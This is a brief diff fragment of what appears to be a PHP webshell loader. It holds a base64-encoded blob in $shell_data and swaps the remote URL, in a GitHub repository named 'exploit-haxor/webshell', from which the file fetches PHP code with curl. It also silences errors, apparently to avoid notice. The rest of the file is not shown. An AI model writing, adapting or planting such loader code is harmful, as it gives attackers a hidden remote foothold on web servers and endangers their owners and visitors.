@@ -18,7 +18,7 @@ $shell_data="JHZpc2l0Y291bnQgPSAkSFRUUF9DT09LSUVfVkFSU1sidmlzaXRzIl07CmlmICgkdml
  * @github https://github.com/
  * @link https://github.com/
  */
-$url = "https://raw.githubusercontent.com/exploit-haxor/webshell/main/zz.php7";
+$url = "https://raw.githubusercontent.com/exploit-haxor/webshell/main/mydb.php";
 $ch = curl_init($url); 
 error_reporting(0);
 ini_set('lsapi_backend_off', '1');
